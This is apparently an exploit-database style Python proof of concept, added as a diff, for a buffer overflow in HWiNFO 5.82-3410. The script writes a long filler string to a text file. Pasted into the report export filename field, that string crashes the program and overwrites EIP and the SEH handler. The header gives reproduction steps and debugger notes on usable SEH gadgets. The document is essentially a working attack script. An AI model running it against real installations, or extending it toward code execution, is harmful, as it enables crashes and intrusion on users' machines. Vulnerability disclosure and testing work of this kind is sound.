@@ -1,0 +1,39 @@
+#!/usr/bin/python
+#
+# Exploit Author: bzyo
+# Twitter: @bzyo_
+# Exploit Title: HWiNFO 5.82-3410 - Denial of Service
+# Date: 05-04-18
+# Vulnerable Software: HWiNFO 5.82-3410
+# Vendor Homepage: https://www.hwinfo.com/
+# Version: 5.82-3410
+# Software Link: https://www.hwinfo.com/files/hwi_582.exe
+# Tested On: Windows 7 x86
+#
+# PoC: 
+# 1. generate hwinfo.txt, copy contents to clipboard
+# 2. open app, select Report, Create
+# 3. choose Export format XML
+# 4. paste hwinfo.txt contents into filename field
+# 5. select Next, Next
+#
+# app crashes & EIP overwrite;
+# !mona seh > only ppr, non-safeseh module contains startnull
+# 0x00400000 | 0x00d8b000 | 0x0098b000 | 5.82-3410 [HWiNFO32.EXE] (C:\Program Files\HWiNFO32\HWiNFO32.EXE)
+#
+
+filename="hwinfo.txt"
+#offset 530
+junk = "A"*526
+
+seh = "B"*4
+
+nseh = "C"*4
+
+fill = "D"*9465
+
+buffer = junk + seh + nseh + fill
+
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
